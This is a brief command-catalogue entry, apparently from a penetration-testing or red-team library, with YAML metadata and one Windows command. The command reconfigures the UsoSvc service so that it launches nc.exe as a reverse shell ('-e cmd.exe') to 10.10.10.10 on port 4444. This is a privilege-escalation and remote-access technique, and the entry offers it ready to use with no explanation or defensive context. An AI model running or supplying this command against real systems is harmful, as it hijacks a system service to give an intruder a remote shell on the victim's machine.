---
id: 7ef427b0-b7c9-473d-8e07-49d5c076f09f
name: Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444
type: command
executor: bash
data: sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
output: null
created_at: '2023-04-06T03:56:29.494877+00:00'
updated_at: '2023-04-10T20:37:42.379030+00:00'
---

# Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444

```bash
sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
